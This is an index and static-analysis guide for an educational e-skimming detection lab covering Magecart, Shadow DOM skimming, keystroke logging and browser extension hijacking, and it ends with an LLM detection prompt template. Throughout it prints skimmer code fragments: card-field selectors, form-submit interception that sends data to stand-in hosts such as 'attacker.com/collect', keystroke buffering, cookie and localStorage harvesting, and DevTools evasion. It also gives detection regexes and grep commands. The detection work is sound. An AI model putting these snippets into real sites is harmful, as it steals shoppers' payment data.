# E-Skimming Detection Analysis - Complete Documentation Index

**Generated:** November 10, 2024  
**Analysis Scope:** Labs 01, 02A, 02B, 03  
**Total Documentation:** 80+ KB of detailed analysis

---

## Primary Documents

### 1. **E-SKIMMING-DETECTION-PATTERNS.md** (41 KB)
**Comprehensive Technical Reference**

The definitive technical breakdown covering all detection patterns across all three labs.

**Contents:**
- Lab 01: Basic Magecart Attack
  - Suspicious code structure analysis
  - Network behavior indicators
  - DOM manipulation techniques
  - Detection signatures (4 key snippets)
  
- Lab 02A: Shadow DOM Skimming
  - Shadow infrastructure creation
  - Cross-shadow boundary monitoring
  - Stealth measures and anti-debugging
  - Detection signatures (6 key snippets)
  
- Lab 02B: Real-Time DOM Monitoring
  - MutationObserver patterns
  - Keystroke logging analysis
  - Data collection methods
  - Detection signatures (8 key snippets)
  
- Lab 03: Browser Extension Hijacking
  - Dual-mode code architecture
  - Data harvesting techniques
  - Multi-channel transmission
  - Detection signatures (8 key snippets)
  
- Comparative Analysis
- Unified Detection Indicators
- Tool-specific Detection Methods

**Best For:** Deep technical understanding, code analysis, security research

---

### 2. **DETECTION-QUICK-REFERENCE.md** (8.7 KB)
**Practical Field Guide for Security Professionals**

Fast-reference guide optimized for quick lookups during incident response.

**Contents:**
- Detection priority by attack type
- Universal detection patterns (5 major categories)
- Browser DevTools step-by-step instructions
- Memory/Performance indicators
- Code signature cheat sheet
- Tool recommendations
- Remediation by lab type
- Emergency detection checklist

**Best For:** Quick reference, incident response, field analysts

**Quick Stats:**
- Lab 01 Detection: 3/10 difficulty (very easy)
- Lab 02A Detection: 8/10 difficulty (hard)
- Lab 02B Detection: 6/10 difficulty (medium)
- Lab 03 Detection: 9/10 difficulty (very hard)

---

### 3. **ANALYSIS-SUMMARY.txt** (14 KB)
**Executive Summary with Risk Assessment**

High-level overview with risk ratings and mitigation recommendations.

**Contents:**
- Key findings for each lab
- Detection patterns comparison matrix
- Detection by tool category
- Risk assessment (probability of detection)
- Immediate/medium/long-term mitigations
- Conclusion and recommendations

**Best For:** Management briefings, risk assessment, strategic planning

---

## Lab-Specific Analysis

### Lab 01: Basic Magecart
- **Risk Level:** LOW (2018-era technique)
- **Detection Difficulty:** EASY (3/10)
- **Key Indicators:** Dual IIFE blocks, CONFIG object, POST to /collect
- **Time to Detect:** 1-2 hours
- **Primary Tool:** Browser DevTools Network tab

**Quick Detection Commands:**
```bash
grep -n "exfilUrl\|CONFIG\|exfiltrate" *.js
```

### Lab 02A: Shadow DOM Skimming
- **Risk Level:** HIGH (2023+ technique)
- **Detection Difficulty:** HARD (8/10)
- **Key Indicators:** Zero-sized elements, Object.defineProperty, Prototype changes
- **Time to Detect:** 4-8 hours
- **Primary Tool:** DOM Inspector, JavaScript debugger

**Quick Detection:**
```javascript
// Check for hidden shadow infrastructure
Object.keys(document.body).filter(k => document.body[k]?.shadowRoot)
```

### Lab 02B: Real-Time DOM Monitoring
- **Risk Level:** HIGH (2023+ technique)
- **Detection Difficulty:** MEDIUM (6/10)
- **Key Indicators:** MutationObserver, keydown/keyup listeners, WeakSet tracking
- **Time to Detect:** 2-4 hours
- **Primary Tool:** Network monitor + JavaScript inspector

**Quick Detection:**
```javascript
// Check for keystroke listeners
getEventListeners(document).keydown?.length > 0
```

### Lab 03: Browser Extension Hijacking
- **Risk Level:** CRITICAL (2024+ technique)
- **Detection Difficulty:** VERY HARD (9/10)
- **Key Indicators:** Legitimate code + malicious init, form harvesting, multi-channel C2
- **Time to Detect:** 8+ hours
- **Primary Tool:** Extension audit, source code analysis

**Quick Detection:**
```javascript
// Check manifest for suspicious permissions
chrome.runtime.getManifest().permissions
```

---

## Detection Signatures Summary

### Configuration Objects (All Labs)
```javascript
// Lab 01
const CONFIG = { exfilUrl: 'http://localhost:9002/collect' }

// Lab 02A
const CONFIG = { shadowMode: 'closed', maxShadowDepth: 5 }

// Lab 02B
const CONFIG = { reportInterval: 5000, keystrokeInterval: 50 }

// Lab 03
const MALICIOUS_CONFIG = { targetDomains: ['checkout', 'payment'] }
```

### Exfiltration Patterns (All Labs)
```javascript
// Primary: fetch POST
fetch(exfilUrl, { method: 'POST', body: JSON.stringify(data) })

// Fallback: Image beacon
new Image().src = url + '?' + btoa(JSON.stringify(data))

// Reliable: sendBeacon
navigator.sendBeacon(url, JSON.stringify(data))
```

### Field Targeting (All Labs)
```javascript
// Pattern matching for payment fields
const selectors = [
  'input[name*="card"]',
  'input[id*="cvv"]',
  'input[autocomplete*="cc-"]',
  'input[type="password"]'
]
```

---

## Key Detection Methods by Tool

### Browser DevTools
1. **Network Tab**
   - Filter: `type:xhr OR type:fetch`
   - Look for POST to suspicious domains
   - Check payload for card data

2. **Console**
   - Run: `getEventListeners(document.forms[0])`
   - Look for unexpected listeners
   - Search for: `exfil`, `collect`, `beacon`

3. **Elements**
   - Look for 0-sized hidden elements
   - Check z-index (negative = suspicious)
   - Inspect shadow DOM creation

4. **Sources**
   - Search code for malicious patterns
   - Check for prototype modifications
   - Review event listener attachments

### Command Line Tools
```bash
# Search for exfiltration endpoints
grep -r "exfil\|collect\|beacon" ./malicious-code/

# Find Shadow DOM usage
grep -n "attachShadow" *.js

# Detect MutationObserver
grep -n "MutationObserver" *.js

# Find prototype modifications
grep -n "prototype\." *.js
```

### Network Analysis
```bash
# Capture network traffic
tcpdump -i any 'tcp port 9002'

# Monitor for C2 communication
wireshark -i any 'tcp.dstport == 9002'
```

---

## Data Collection Progression

### Lab 01: Basic Collection
- Card number
- CVV
- Expiry date
- Cardholder name
- Billing address

### Lab 02: Enhanced Collection
- All of Lab 01 +
- Keystroke sequences
- Event timestamps
- Field focus/blur
- Paste events
- Individual key codes

### Lab 03: Complete Collection
- All of Lab 02 +
- Cookies
- LocalStorage
- Clipboard content
- Form submission data
- Session identifiers

---

## Attack Timeline

```
Lab 01 (2018) → Lab 02 (2023) → Lab 03 (2024+)

Basic Injection    DOM Exploitation    Extension Abuse
Simple Code        Advanced Stealth     Trust Exploitation
Visible Network    Evasion Techniques   No External Signals
Low Complexity     High Complexity      Very High Complexity
```

---

## Remediation Quick Reference

### Immediate (Days)
- [ ] Deploy CSP headers
- [ ] Implement SRI for scripts
- [ ] Enable File Integrity Monitoring
- [ ] Audit browser extensions

### Short-term (Weeks)
- [ ] Implement Trusted Types
- [ ] Monitor Shadow DOM creation
- [ ] Detect prototype pollution
- [ ] Add keystroke monitoring detection

### Medium-term (Months)
- [ ] Deploy WAF rules
- [ ] Implement Zero Trust
- [ ] Add ML-based detection
- [ ] Security awareness training

---

## Document Statistics

| Document | Size | Lines | Focus |
|----------|------|-------|-------|
| E-SKIMMING-DETECTION-PATTERNS.md | 41 KB | 1,503 | Technical Deep Dive |
| DETECTION-QUICK-REFERENCE.md | 8.7 KB | 350 | Field Guide |
| ANALYSIS-SUMMARY.txt | 14 KB | 370 | Executive Summary |
| DETECTION-ANALYSIS-INDEX.md | This file | - | Navigation Guide |

**Total Documentation:** 80+ KB covering all attack vectors

---

## Usage Recommendations

### For Security Analysts
1. Start with DETECTION-QUICK-REFERENCE.md
2. Dive into specific sections of E-SKIMMING-DETECTION-PATTERNS.md
3. Use code signatures for grep/static analysis

### For Incident Responders
1. Use DETECTION-QUICK-REFERENCE.md emergency checklist
2. Reference browser DevTools steps
3. Check tool-specific detection methods

### For Security Architects
1. Review ANALYSIS-SUMMARY.txt for risk assessment
2. Use comparison matrix for threat modeling
3. Implement recommendations from remediation sections

### For Developers
1. Review code signatures to understand malicious patterns
2. Learn detection patterns to write secure code
3. Understand attack vectors to avoid them

---

## Key Takeaways

1. **Detection Difficulty Increases Exponentially**
   - Lab 01: Easy with basic tools
   - Lab 02: Requires advanced knowledge
   - Lab 03: Trust exploitation hardest to detect

2. **Multiple Detection Vectors Needed**
   - Static analysis (code review)
   - Dynamic analysis (network monitoring)
   - Behavioral analysis (memory/CPU)
   - Extension audit (permissions)

3. **Layered Defense is Essential**
   - CSP + SRI + FIM + WAF
   - Not one tool catches all attacks
   - Combination approach yields best results

4. **Evolution of Attacks is Rapid**
   - 2018: Simple file injection
   - 2023: Advanced DOM manipulation
   - 2024+: Trust-based exploitation

---

## Additional Resources in Repository

- `/labs/01-basic-magecart/` - Lab 01 vulnerable site and C2 server
- `/labs/02-dom-skimming/` - Lab 02 Shadow DOM and DOM monitoring attacks
- `/labs/03-extension-hijacking/` - Lab 03 browser extension hijacking
- Original lab READMEs with setup instructions
- Test suites for validating detection

---

## Contact & Updates

- Analysis Date: November 10, 2024
- Framework: E-Skimming Labs (Educational)
- License: Educational Use Only
- Disclaimer: For defensive/educational purposes only

---

**Last Updated:** 2024-11-10  
**Status:** Complete and comprehensive analysis

---

## STATIC ANALYSIS-SUMMARY

### Overview

Static code analysis is the most effective detection method for e-skimming attacks, as it can identify malicious patterns without requiring runtime execution. This section consolidates all static analysis detection techniques suitable for automated scanning, code review, and LLM-assisted analysis.

**Important Note on Obfuscation:**
Real-world attackers obfuscate variable and function names (e.g., `CONFIG` → `a0x1b2c`, `extractCardData()` → `x()`). This section focuses on **obfuscation-resistant patterns** that survive code minification and variable renaming:
- **Behavioral patterns**: Code structure and execution flow
- **Structural patterns**: DOM manipulation techniques
- **Technical patterns**: API usage and method calls
- **URL patterns**: Suspicious endpoint paths and domains

Patterns based solely on naming conventions (like `exfiltrateData`, `MALICIOUS_CONFIG`) are excluded as they would be obfuscated in real attacks.

### Detection Categories

#### 1. Code Structure Patterns

**Dual IIFE Blocks (Lab 01)**
```javascript
// SUSPICIOUS: Two separate IIFE blocks in same file
;(function () { /* legitimate code */ })()
;(function () { /* malicious code appended */ })()
```
**Detection:** Look for multiple IIFE blocks, especially with delayed initialization (`setTimeout`)

**Dual-Mode Initialization (Lab 03)**
```javascript
// SUSPICIOUS: Legitimate + malicious initialization mixed
function init() {
  loadSettings()              // Legitimate
  setupFormMonitoring()       // Legitimate
  initializeMaliciousCollection() // Malicious
  scanPage()                  // Legitimate
}
```
**Detection:** Functions that mix legitimate and suspicious operations

#### 2. Configuration Objects

**C2 Endpoint Configuration**
```javascript
// SUSPICIOUS: Hardcoded exfiltration URLs (obfuscated variable names in real attacks)
const a0x1b2c = {
  url: 'http://localhost:9002/collect',
  delay: 100
}
```
**Detection Patterns:**
- Object properties containing URLs with suspicious paths: `/collect`, `/beacon`, `/data`, `/exfil`
- Hardcoded URLs to external domains or localhost ports (9000-9999 range)
- Multiple URL properties in same object (primary + fallback endpoints)
- URL patterns: `http://[domain]/collect`, `https://[domain]/beacon`, `http://localhost:90[0-9][0-9]`
- Base64-encoded URLs: `atob('aHR0cDovL2F0dGFja2VyLmNvbS9jb2xsZWN0')`

#### 3. Behavioral Patterns (Obfuscation-Resistant)

**Data Extraction Behavior**
```javascript
// SUSPICIOUS: Function that queries multiple form field selectors
function x() {
  const d = {
    a: getValue(['#card-number', '[name="cardNumber"]']),
    b: getValue(['#cvv', '[name="cvv"]']),
    c: getValue(['#expiry', '[name="expiry"]'])
  }
  return d
}
```
**Detection Patterns:**
- Functions that query multiple CSS selectors for the same field (fallback selectors)
- Functions that collect data from form fields into an object
- Functions that iterate over form inputs and extract values
- Pattern: Multiple `querySelector`/`getElementById` calls collecting form data

**Exfiltration Behavior**
```javascript
// SUSPICIOUS: Function that sends data via multiple methods
function y(d) {
  fetch(url, { method: 'POST', body: JSON.stringify(d) })
    .catch(() => {
      new Image().src = url + '?' + btoa(JSON.stringify(d))
    })
}
```
**Detection Patterns:**
- Functions that use `fetch()` with `method: 'POST'` and `JSON.stringify()` in body
- Functions with fallback mechanisms (try-catch with alternative send methods)
- Functions using `btoa()` or `atob()` with `JSON.stringify()`
- Functions using `navigator.sendBeacon()` or `new Image().src` for data transmission
- Pattern: POST request followed by Image beacon fallback

**Initialization Behavior**
```javascript
// SUSPICIOUS: Delayed initialization with form attachment
setTimeout(function() {
  const f = document.querySelector('#payment-form')
  f.addEventListener('submit', function(e) {
    const d = extractData()
    sendData(d)
  })
}, 500)
```
**Detection Patterns:**
- `setTimeout`/`setInterval` wrapping form event listener attachment
- Functions that attach event listeners to forms after page load
- Functions that query for forms and attach submit listeners
- Pattern: Delayed execution + form query + event listener attachment

#### 4. Field Targeting Patterns

**Payment Field Selectors**
```javascript
// SUSPICIOUS: Multiple selectors targeting payment fields
const selectors = [
  'input[name*="card"]',
  'input[id*="card"]',
  'input[autocomplete*="cc-number"]',
  'input[autocomplete*="cc-exp"]',
  'input[autocomplete*="cc-csc"]',
  'input[name*="cvv"]',
  'input[id*="cvv"]',
  'input[type="password"]',
  'input[name*="account"]',
  'input[name*="routing"]'
]
```
**Detection Regex:**
```regex
/input\[.*?(card|cvv|cvc|exp|routing|account|password|cc-)/i
```

**Sensitive Field Identification**
```javascript
// SUSPICIOUS: Pattern matching for sensitive fields
fieldData.isSensitive =
  fieldData.type === 'password' ||
  nameId.includes('card') ||
  nameId.includes('credit') ||
  nameId.includes('cvv') ||
  nameId.includes('cvc') ||
  nameId.includes('ssn') ||
  nameId.includes('bank') ||
  nameId.includes('account') ||
  nameId.includes('routing')
```
**Detection:** String matching for sensitive field names

#### 5. Exfiltration Patterns

**Primary Exfiltration Methods**
```javascript
// SUSPICIOUS: POST requests with JSON payloads
fetch(CONFIG.exfilUrl, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(data)
})

// SUSPICIOUS: sendBeacon usage
navigator.sendBeacon(url, JSON.stringify(data))

// SUSPICIOUS: Image beacon fallback
const img = new Image()
img.src = url + '?' + btoa(JSON.stringify(data))
```
**Detection Regex:**
```regex
/(fetch|XMLHttpRequest|sendBeacon|Image).*POST|btoa.*JSON\.stringify/i
```

**Multi-Channel Transmission**
```javascript
// SUSPICIOUS: Multiple fallback endpoints
try {
  await fetch(MALICIOUS_CONFIG.devUrl, {...})
} catch {
  await fetch(MALICIOUS_CONFIG.fallbackUrl, {...})
}
```
**Detection:** Try-catch blocks with multiple fetch calls to different URLs

#### 6. Shadow DOM Patterns (Lab 02A)

**Shadow Infrastructure Creation**
```javascript
// SUSPICIOUS: Hidden shadow DOM creation
const shadowHost = document.createElement('div')
shadowHost.style.cssText = `
  position: absolute;
  width: 0; height: 0;
  opacity: 0;
  pointer-events: none;
  z-index: -1;
`
const shadowRoot = shadowHost.attachShadow({ mode: 'closed' })
```
**Detection:**
- `attachShadow({ mode: 'closed' })`
- Zero-sized elements with negative z-index
- Hidden elements with `opacity: 0`

**Nested Shadow DOM**
```javascript
// SUSPICIOUS: Multiple shadow DOM levels
for (let depth = 0; depth < maxShadowDepth; depth++) {
  createShadowInfrastructure()
}
```
**Detection:** Loops creating multiple shadow roots

#### 7. Prototype Modifications (Lab 02A)

**Event Listener Override**
```javascript
// SUSPICIOUS: Prototype monkey-patching
const originalAddEventListener = Element.prototype.addEventListener
Element.prototype.addEventListener = function(type, listener, options) {
  // Malicious interception
  return originalAddEventListener.call(this, type, listener, options)
}
```
**Detection:**
- `Element.prototype.addEventListener` overrides
- `HTMLElement.prototype` modifications
- `Object.defineProperty` on prototypes

**Property Descriptor Override**
```javascript
// SUSPICIOUS: Hiding element properties
Object.defineProperty(host, 'style', {
  get: () => ({ cssText: '', ... }),
  configurable: false
})
```
**Detection:** `Object.defineProperty` with `configurable: false` on DOM elements

#### 8. MutationObserver Patterns (Lab 02B)

**Document-Wide Monitoring**
```javascript
// SUSPICIOUS: MutationObserver watching entire document
mutationObserver = new MutationObserver(mutations => {
  mutations.forEach(mutation => {
    if (mutation.type === 'childList') {
      findFieldsInNode(mutation.target)
    }
  })
})

mutationObserver.observe(document, {
  childList: true,
  subtree: true,
  attributes: true,
  attributeFilter: ['type', 'name', 'autocomplete']
})
```
**Detection:**
- `new MutationObserver` with `subtree: true`
- Observing `document` or `document.body`
- `attributeFilter` containing form-related attributes

#### 9. Keystroke Logging Patterns (Lab 02B, 03)

**Global Keystroke Listeners**
```javascript
// SUSPICIOUS: Document-level keydown/keyup listeners
document.addEventListener('keydown', e => {
  keystrokes.push({
    timestamp: Date.now(),
    key: e.key,
    keyCode: e.keyCode
  })
})

document.addEventListener('keyup', e => {
  captureKeystroke(e)
})
```
**Detection:**
- `document.addEventListener('keydown'` or `'keyup'`
- Arrays named: `keystrokes`, `keyBuffer`, `keyLog`
- Objects with `key`, `keyCode`, `timestamp` properties

**Keystroke Buffer Management**
```javascript
// SUSPICIOUS: Keystroke buffering and transmission
let keystrokeBuffer = ''
document.addEventListener('keydown', e => {
  keystrokeBuffer += e.key
  if (keystrokeBuffer.length > 20) {
    transmitKeystrokes(keystrokeBuffer)
    keystrokeBuffer = ''
  }
})
```
**Detection:** String concatenation of keystrokes with periodic transmission

#### 10. Form Submission Interception

**Silent Form Listeners**
```javascript
// SUSPICIOUS: Form submit listener that doesn't preventDefault
form.addEventListener('submit', function(event) {
  const cardData = extractCardData()
  if (hasValidCardData(cardData)) {
    setTimeout(() => {
      exfiltrateData(cardData)
    }, delay)
  }
  // NOTE: Does NOT call event.preventDefault()
})
```
**Detection:**
- `addEventListener('submit'` on forms
- Data extraction before submission
- No `event.preventDefault()` call
- `setTimeout` with data transmission

**Form Data Capture**
```javascript
// SUSPICIOUS: Capturing all form fields on submit
function captureFormSubmission(form) {
  const inputs = form.querySelectorAll('input, textarea, select')
  inputs.forEach(input => {
    if (input.value) {
      submissionData.fields.push({
        name: input.name,
        type: input.type,
        value: input.value  // Capturing values
      })
    }
  })
}
```
**Detection:** Functions that iterate form fields and collect values

#### 11. Extension-Specific Patterns (Lab 03)

**Content Script Field Monitoring**
```javascript
// SUSPICIOUS: Extension content script monitoring forms
function attachMaliciousCollection(form) {
  const inputs = form.querySelectorAll('input, textarea, select')
  inputs.forEach(input => {
    input.addEventListener('input', e => captureFieldData(e.target))
    input.addEventListener('change', e => captureFieldData(e.target))
    input.addEventListener('blur', e => captureFieldData(e.target))
  })
}
```
**Detection:** Multiple event listeners (`input`, `change`, `blur`) on form fields

**Clipboard Monitoring**
```javascript
// SUSPICIOUS: Clipboard content capture
document.addEventListener('paste', async e => {
  const clipboardData = e.clipboardData?.getData('text')
  if (clipboardData.length > 0) {
    dataBuffer.push({ type: 'clipboard', data: clipboardData })
  }
})
```
**Detection:** `addEventListener('paste'` with data collection

**Storage Harvesting**
```javascript
// SUSPICIOUS: Cookie and localStorage access
const cookies = document.cookie
const localStorageData = {}
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i)
  localStorageData[key] = localStorage.getItem(key)
}
```
**Detection:** Bulk access to `document.cookie` or `localStorage`

#### 12. Timing and Evasion Patterns

**Delayed Initialization**
```javascript
// SUSPICIOUS: Delayed malicious code execution
setTimeout(function() {
  initSkimmer()
}, 500)

setTimeout(() => {
  initializeMaliciousCollection()
}, 1000)
```
**Detection:** `setTimeout` with function names containing: `init`, `start`, `setup`, `initialize`

**Periodic Reporting**
```javascript
// SUSPICIOUS: Regular data transmission intervals
setInterval(() => {
  if (capturedData.length > 0) {
    exfiltrateData(capturedData)
  }
}, 5000) // Every 5 seconds
```
**Detection:** `setInterval` with data transmission functions

**DevTools Detection**
```javascript
// SUSPICIOUS: Detecting developer tools
setInterval(() => {
  const threshold = 160
  if (window.outerHeight - window.innerHeight > threshold) {
    enhancedStealthMode()
  }
}, 1000)
```
**Detection:** Window dimension checks with stealth mode activation

### Static Analysis Detection Regex Patterns

```regex
# Suspicious URL Patterns (obfuscation-resistant)
/https?:\/\/[^'"]+\/(collect|beacon|data|exfil|upload|report)/i
/http:\/\/localhost:90[0-9][0-9]/i
/btoa\s*\(\s*JSON\.stringify|atob\s*\(['"][A-Za-z0-9+\/=]+['"]/i

# Multiple Selector Patterns (fallback selectors)
/querySelector.*\[.*\].*\[.*\]|getElementById.*getElementByName/i

# Form Data Collection Pattern
/querySelector.*input.*forEach|querySelectorAll.*input.*map/i

# Exfiltration Methods (behavioral, not naming)
/fetch\s*\([^,]+,\s*\{\s*method\s*:\s*['"]POST['"]/i
/JSON\.stringify.*fetch|fetch.*JSON\.stringify/i
/new\s+Image\s*\(\s*\).*\.src\s*=.*btoa|sendBeacon.*JSON\.stringify/i

# Field Targeting (CSS selector patterns)
/input\[.*?(card|cvv|cvc|exp|routing|account|password|cc-)/i
/autocomplete\s*[=:]\s*['"]cc-|name\s*[=:]\s*['"].*card/i

# Shadow DOM (structural pattern)
/attachShadow\s*\(\s*\{\s*mode\s*:\s*['"]closed['"]/i
/width\s*:\s*0.*height\s*:\s*0.*z-index\s*:\s*-1/i

# Prototype Modifications (structural pattern)
/(Element|HTMLElement|Object)\.prototype\.(addEventListener|defineProperty)/i
/Object\.defineProperty.*configurable\s*:\s*false/i

# MutationObserver (behavioral pattern)
/new\s+MutationObserver.*observe\s*\(\s*document/i
/MutationObserver.*subtree\s*:\s*true/i

# Keystroke Logging (behavioral pattern)
/document\.addEventListener\s*\(\s*['"]keydown['"]|['"]keyup['"]/i
/keydown.*push|keyup.*push|keystroke/i

# Form Interception (behavioral pattern)
/querySelector.*form.*addEventListener\s*\(\s*['"]submit['"]/i
/getElementById.*form.*addEventListener\s*\(\s*['"]submit['"]/i

# Timing Evasion (behavioral pattern)
/setTimeout.*querySelector.*form|setTimeout.*addEventListener.*submit/i
/setInterval.*fetch.*POST|setInterval.*sendBeacon/i

# Data Collection Pattern
/querySelectorAll\s*\(\s*['"]input|textarea|select['"]/i
/forEach.*value.*push|map.*value.*push/i
```

### Code Signature Examples (Obfuscation-Resistant)

**Lab 01 Signature:**
```javascript
// Detects: URL pattern + form query + POST with JSON + submit listener
const x = { url: 'http://domain.com/collect' }
function a() {
  const d = {
    a: getValue(['#card-number', '[name="cardNumber"]']),
    b: getValue(['#cvv'])
  }
  return d
}
document.querySelector('#payment-form').addEventListener('submit', function(e) {
  fetch(x.url, { method: 'POST', body: JSON.stringify(a()) })
})
```

**Lab 02A Signature:**
```javascript
// Detects: Shadow DOM + prototype modification (structural patterns)
const h = document.createElement('div')
h.style.cssText = 'width: 0; height: 0; opacity: 0; z-index: -1'
h.attachShadow({ mode: 'closed' })
const orig = Element.prototype.addEventListener
Element.prototype.addEventListener = function(t, l) { return orig.call(this, t, l) }
Object.defineProperty(h, 'style', { configurable: false })
```

**Lab 02B Signature:**
```javascript
// Detects: MutationObserver + keystroke logging + periodic transmission
new MutationObserver(m => {
  m.forEach(mut => findFieldsInNode(mut.target))
}).observe(document, { childList: true, subtree: true })
document.addEventListener('keydown', e => { k.push({ key: e.key }) })
setInterval(() => {
  fetch(url, { method: 'POST', body: JSON.stringify({ k: k }) })
}, 5000)
```

**Lab 03 Signature:**
```javascript
// Detects: Multiple event listeners on inputs + multi-channel transmission
function init() {
  loadSettings()
  setupFormMonitoring()
  initializeCollection() // Hidden malicious init
}
inputs.forEach(i => {
  i.addEventListener('input', capture)
  i.addEventListener('change', capture)
  i.addEventListener('blur', capture)
})
try { fetch(url1, { method: 'POST', body: JSON.stringify(d) }) }
catch { fetch(url2, { method: 'POST', body: JSON.stringify(d) }) }
```

### Static Analysis Tools

**Command Line (Obfuscation-Resistant Patterns):**
```bash
# Search for suspicious URL patterns (not variable names)
grep -rE "https?://[^'\"]+/(collect|beacon|data|exfil|upload)" ./js/
grep -rE "http://localhost:90[0-9][0-9]" ./js/

# Find Shadow DOM usage (structural pattern)
grep -n "attachShadow" *.js
grep -n "mode.*closed" *.js

# Detect MutationObserver (behavioral pattern)
grep -n "MutationObserver" *.js
grep -n "subtree.*true" *.js

# Find prototype modifications (structural pattern)
grep -n "prototype\." *.js
grep -n "Object\.defineProperty" *.js

# Find keystroke listeners (behavioral pattern)
grep -nE "addEventListener.*['\"]keydown['\"]|['\"]keyup['\"]" *.js

# Find form interceptors (behavioral pattern)
grep -nE "querySelector.*form.*addEventListener.*submit|getElementById.*form.*addEventListener.*submit" *.js

# Find POST requests with JSON.stringify (behavioral pattern)
grep -nE "fetch.*method.*POST|JSON\.stringify.*fetch" *.js

# Find base64 encoding with JSON (obfuscation technique)
grep -nE "btoa.*JSON\.stringify|atob.*JSON" *.js

# Find multiple selector patterns (fallback selectors)
grep -nE "querySelector.*\[.*\].*\[.*\]" *.js
```

**Automated Scanning:**
- ESLint with custom rules
- Semgrep patterns
- CodeQL queries
- Custom AST analyzers

---

## LLM PROMPT FOR E-SKIMMING DETECTION

### Prompt Template

```
You are a security code analyst specializing in detecting e-skimming (credit card skimming) attacks in JavaScript code. Your task is to analyze provided code and identify malicious patterns that indicate credit card data theft.

## Detection Criteria

Analyze the code for the following malicious patterns:

### 1. Configuration Objects (Obfuscation-Resistant)
Look for objects containing exfiltration endpoints (variable names will be obfuscated):
- Object properties containing URLs with suspicious paths: `/collect`, `/beacon`, `/data`, `/exfil`
- Hardcoded URLs to external domains or localhost ports (9000-9999 range)
- Multiple URL properties in same object (primary + fallback pattern)
- Base64-encoded URLs: `atob('aHR0cDovL2F0dGFja2VyLmNvbS9jb2xsZWN0')`

Example (realistic obfuscated version):
```javascript
const a0x1b2c = {
  url: 'http://attacker.com/collect',
  delay: 100
}
// Or base64 encoded:
const x = atob('aHR0cDovL2F0dGFja2VyLmNvbS9jb2xsZWN0')
```

### 2. Data Extraction Behavior (Obfuscation-Resistant)
Identify functions that extract sensitive form data (function names will be obfuscated):
- Functions that query multiple CSS selectors for the same field (fallback pattern)
- Functions that collect data from form fields into an object
- Functions that iterate over form inputs and extract values
- Pattern: Multiple `querySelector`/`getElementById` calls collecting form data

Example (realistic obfuscated version):
```javascript
function x() {
  const d = {
    a: getValue(['#card-number', '[name="cardNumber"]']),
    b: getValue(['#cvv', '[name="cvv"]']),
    c: getValue(['#expiry', '[name="expiry"]'])
  }
  return d
}
```

### 3. Exfiltration Behavior (Obfuscation-Resistant)
Identify functions that send data to external servers (function names will be obfuscated):
- Functions using `fetch()` with `method: 'POST'` and `JSON.stringify()` in body
- Functions with fallback mechanisms (try-catch with alternative send methods)
- Functions using `btoa()` or `atob()` with `JSON.stringify()`
- Functions using `navigator.sendBeacon()` or `new Image().src` for data transmission

Example (realistic obfuscated version):
```javascript
function y(d) {
  fetch(url, { method: 'POST', body: JSON.stringify(d) })
    .catch(() => {
      new Image().src = url + '?' + btoa(JSON.stringify(d))
    })
}
```

### 4. Form Field Targeting
Look for code targeting payment-related form fields:
- Selectors: input[name*="card"], input[id*="cvv"], input[autocomplete*="cc-"]
- Pattern matching: includes('card'), includes('cvv'), includes('password')
- Multiple field selectors in arrays

Example:
```javascript
const selectors = [
  'input[name*="card"]',
  'input[autocomplete*="cc-number"]',
  'input[type="password"]'
]
```

### 5. Form Submission Interception
Identify form submit listeners that capture data:
- addEventListener('submit', ...) on form elements
- Data extraction before submission
- No event.preventDefault() (allows legitimate submission)
- setTimeout with data transmission

Example:
```javascript
form.addEventListener('submit', function(event) {
  const cardData = extractCardData()
  setTimeout(() => exfiltrateData(cardData), 100)
  // Note: Does NOT prevent default
})
```

### 6. Shadow DOM Abuse (Advanced)
Detect hidden shadow DOM infrastructure:
- attachShadow({ mode: 'closed' })
- Zero-sized elements (width: 0, height: 0, opacity: 0)
- Negative z-index elements

Example:
```javascript
const shadowHost = document.createElement('div')
shadowHost.style.cssText = 'width: 0; height: 0; opacity: 0; z-index: -1'
const shadowRoot = shadowHost.attachShadow({ mode: 'closed' })
```

### 7. Prototype Modifications (Advanced)
Identify prototype monkey-patching:
- Element.prototype.addEventListener overrides
- Object.defineProperty on prototypes
- Property descriptor overrides with configurable: false

Example:
```javascript
const original = Element.prototype.addEventListener
Element.prototype.addEventListener = function(type, listener) {
  // Malicious interception
  return original.call(this, type, listener)
}
```

### 8. MutationObserver Usage (Advanced)
Detect document-wide monitoring:
- new MutationObserver with subtree: true
- Observing document or document.body
- Monitoring for form field additions

Example:
```javascript
new MutationObserver(mutations => {
  mutations.forEach(m => {
    if (m.type === 'childList') {
      findFieldsInNode(m.target)
    }
  })
}).observe(document, { childList: true, subtree: true })
```

### 9. Keystroke Logging
Identify global keystroke listeners:
- document.addEventListener('keydown', ...)
- document.addEventListener('keyup', ...)
- Keystroke buffering and transmission

Example:
```javascript
document.addEventListener('keydown', e => {
  keystrokes.push({ key: e.key, timestamp: Date.now() })
})
```

### 10. Timing and Evasion
Detect delayed initialization and periodic reporting:
- setTimeout with init/start/setup functions
- setInterval with exfiltration functions
- DevTools detection code

Example:
```javascript
setTimeout(() => initSkimmer(), 500)
setInterval(() => exfiltrateData(data), 5000)
```

## Analysis Instructions

1. **Scan the code** for patterns matching the criteria above
2. **Identify suspicious code sections** with line numbers
3. **Classify the attack type** (Basic Magecart, DOM Skimming, Extension Hijacking)
4. **Rate the confidence level** (High/Medium/Low)
5. **Provide code snippets** showing the malicious patterns
6. **Suggest remediation** steps

## Output Format

For each detected pattern, provide:
- **Pattern Type**: [Configuration/Extraction/Exfiltration/etc.]
- **Location**: [File name and line numbers]
- **Code Snippet**: [Relevant code]
- **Confidence**: [High/Medium/Low]
- **Explanation**: [Why this is suspicious]
- **Attack Type**: [Lab 01/02A/02B/03]

## Example Analysis

**Pattern Type**: Configuration Object + Exfiltration (Obfuscated)
**Location**: checkout.js:259-263
**Code Snippet**:
```javascript
const a0x1b2c = {
  url: 'http://localhost:9002/collect',
  delay: 100
}
function x(d) {
  fetch(a0x1b2c.url, { method: 'POST', body: JSON.stringify(d) })
}
```
**Confidence**: High
**Explanation**: Hardcoded URL with suspicious path '/collect', POST request with JSON.stringify pattern
**Attack Type**: Lab 01 (Basic Magecart)

---

Now analyze the following code:
[PASTE CODE HERE]
```

### Usage Instructions

1. **Copy the prompt template** above
2. **Paste your JavaScript code** at the `[PASTE CODE HERE]` marker
3. **Submit to an LLM** (Claude, GPT-4, etc.)
4. **Review the analysis** for detected patterns
5. **Verify findings** with manual code review

### Prompt Variations

**For Quick Scanning:**
```
